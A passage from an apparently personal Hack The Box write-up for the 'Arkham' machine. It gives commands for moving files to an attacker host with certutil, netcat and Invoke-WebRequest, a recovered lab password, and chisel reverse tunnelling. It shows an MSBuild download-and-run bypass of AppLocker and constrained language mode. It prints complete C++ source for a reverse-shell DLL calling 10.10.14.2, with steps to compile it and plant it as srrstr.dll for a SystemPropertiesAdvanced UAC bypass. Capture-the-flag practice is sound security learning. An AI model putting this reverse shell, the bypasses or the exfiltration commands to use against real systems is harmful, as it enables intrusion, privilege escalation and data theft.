+<pre><code>certutil -encode backup.zip backup.b64
+type backup.b64
+use tmux set the buffer to 15k, then copy and paste. 
+</code></pre>
+
+<p>some other ideas on how to move the file are below but did NOT work.</p>
+
+<pre><code>Invoke-WebRequest -Uri http://10.10.14.2 -Proxy 'http://10.10.14.2:80' -Method Post -InFile backup.zip
+copy backup.zip //10.10.14.2/share 
+</code></pre>
+
+<pre><code>nc -lvnp 80 &gt; backup.zip
+</code></pre>
+
+<p>im broke and i dont have allot of the windows office crap. i was able to find a tool called pstwalker they constantly bug you for money prolly infected my system.</p>
+
+<p>&rdquo; This was pretty tough to find the right tool to open the outlook file. pstwalker it will try and get you to pay for stuff but thats not needed with a little tinkering i was able to get the message. &ldquo;</p>
+
+<p>Moving the file off of -the host is pretty tricky could move it to the smb share. could move it with nc.exe,</p>
+
+<p><img src="email-password.PNG" alt="email-password" /></p>
+
+<p><strong>BATMAN</strong></p>
+
+<p>Username: Batman    Password: <mark>Zx^#QZX+T!123&rsquo;</mark></p>
+
+<p><em>CHISEL</em></p>
+
+<p>as alfred setup chisel tunneling to 5985 on the localhost download chisel here <a href="https://github.com/jpillora/chisel/releases/download/1.3.1/chisel_windows_amd64.exe.gz">chiselxamd64.exe</a>, download this as well the run go <mark>go build</mark>. i renamed the binary chisel-server.</p>
+
+<pre><code>./chisel-server server -p 9020 --reverse -v 
+.\c.exe client 10.10.14.2:9020 R:5985:127.0.0.1:5985
+</code></pre>
+
+<p><img src="step3.PNG" alt="step3" /></p>
+
+<p>were foolishly given access to msbuild which is use to compile binaries mauahahahahahahahahah. well use this to bypass all the crap in our way and move on to victory.</p>
+
+<p>csproj download <a href="https://github.com/Cn33liz/MSBuildShell">https://github.com/Cn33liz/MSBuildShell</a></p>
+
+<p><a href="https://github.com/MinatoTW/CLMBypassBlogpost/blob/master/Bypass/Bypass.csproj">Bypassing AV CLM or UAC&rsquo;</a>s user account controls. super lame booo i think applockers in there to grouppolicy. I used</p>
+
+<p>@minatotw_ .csproj file sinces its like one of the ones i could find to bypass everything. i end up using a nishang Invoke-tcp.ps1 then pivoting and getting a meterpreter shell so i can gain access to the gui&rsquo;s</p>
+
+<pre><code>iwr &quot;http://10.10.14.2/minato.csproj&quot; -outfile .\pinkie.csproj
+c:\windows\microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\pinkie.csproj
+</code></pre>
+
+<p>setup netcat and check and make sure python http server is running.</p>
+
+<p><em>Assembling the DLL</em></p>
+
+<p>There are there parts to a dll when it comes to compiling them dllmain.cpp the payload revshell.cpp and a header file rev_shell.h. i tried compiling this in visual studios, i also tried the msfvenom build dlls. Defender Laughs.</p>
+
+<p><strong><em>dllmain.cpp</em></strong> I tried awhole host of different dllmains this is the one i got to work. it calls in the header section revshell.h, DLL_PROCESS cal the revshell and assembles our payload.</p>
+
+<pre><code>#include &quot;rev_shell.h&quot;
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+BOOL WINAPI DllMain( HINSTANCE hinstDLL,
+                        DWORD fwdReason,
+                        LPVOID lpReservered)
+{
+        switch (fwdReason)
+        {
+        case DLL_PROCESS_ATTACH:
+                rev_shell();
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+                break;
+        }
+        return TRUE;
+}
+</code></pre>
+
+<p><strong><em>revshell.cpp</em></strong> CHANGE THE REMOTE_PORT AND REMOTE_ADDR</p>
+
+<pre><code>#include &lt;stdio.h&gt;                                                                               
+#include &lt;string.h&gt;
+#include &lt;process.h&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;ws2tcpip.h&gt;
+
+#pragma comment(lib, &quot;Ws2_32.lib&quot;)
+
+#define REMOTE_ADDR &quot;10.10.14.2&quot;
+#define REMOTE_PORT &quot;9135&quot;
+
+void rev_shell()
+{
+        FreeConsole();
+
+        WSADATA wsaData;
+        int iResult = WSAStartup(MAKEWORD(2, 2), &amp;wsaData);
+        struct addrinfo *result = NULL, *ptr = NULL, hints;
+        memset(&amp;hints, 0, sizeof(hints));
+        hints.ai_family = AF_UNSPEC;
+        hints.ai_socktype = SOCK_STREAM;
+        hints.ai_protocol = IPPROTO_TCP;
+        getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &amp;hints, &amp;result);
+        ptr = result;
+        SOCKET ConnectSocket = WSASocket(ptr-&gt;ai_family, ptr-&gt;ai_socktype, ptr-&gt;ai_protocol, NULL, NULL, NULL);                                              
+        connect(ConnectSocket, ptr-&gt;ai_addr, (int)ptr-&gt;ai_addrlen);
+        STARTUPINFO si;
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&amp;si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&amp;pi, sizeof(pi));
+        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        si.hStdInput = (HANDLE)ConnectSocket;
+        si.hStdOutput = (HANDLE)ConnectSocket;
+        si.hStdError = (HANDLE)ConnectSocket;
+        TCHAR cmd[] = TEXT(&quot;C:\\WINDOWS\\SYSTEM32\\CMD.EXE&quot;);
+        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+	    WSACleanup();
+}
+</code></pre>
+
+<p><strong><em>rev_shell.h</em></strong></p>
+
+<pre><code>#pragma Once
+
+void rev_shell();
+</code></pre>
+
+<p><strong><em>Compiling the DLL</em></strong> -</p>
+
+<p><a href="https://egre55.github.io/system-properties-uac-bypass/">https://egre55.github.io/system-properties-uac-bypass/</a></p>
+
+<p><a href="https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/">https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/</a></p>
+
+<p>Firstly install mingw there are a bunch of version you want, no need them all. <mark>apt-get install mingw*</mark> my notes were pretty confusing. after it&rsquo;s compiled move it over to the python web server then drop it to disk with invoke web request. drop the file in <mark>c:\users\batman\appdata\local\microsoft\windowsapps\ </mark>. Then we&rsquo;ll run <mark>c:\windows\system32\systempropertiesAdvanced.exe </mark> or <mark>c:\windows\syswow64\systempropertiesAdvanced.exe</mark></p>
+
+<pre><code>x86_64-w64-mingw32-gcc -shared -o death-piex86.dll dllmain.cpp revshell.cpp rev_shell.h -lws2_32
+</code></pre>
+
+<p>on arkham do the following</p>
+
+<pre><code>cd c:\users\batman\appdata\local\microsoft\windowsapps
+powershell iwr 'http://10.10.14.2/death-piex86.dll' -outfile .\srrstr.dll
+</code></pre>
+
+<p>BE SURE TO SETUP A NETCAT LISTENER locally</p>
+
+<pre><code>nc -lcnp 9135 :P
+</code></pre>
+
+<pre><code>c:\windows\syswow64\systempropertiesAdvanced.exe
+</code></pre>
+
+<p>You&rsquo;ll notice you are still batman when you run <mark>whoami</mark> you are in a elevated session the session has the permissions associated with <mark>systempropertiesadvanced.exe</mark></p>
+
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/arkham/" title="Arkhams"> <i class="fa fa-chevron-left"></i><label>Arkhams</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/arkham/notes/" title="arkham notes" style="margin-right: 0px;"><label>arkham notes</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/arkham/writeup/_index.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
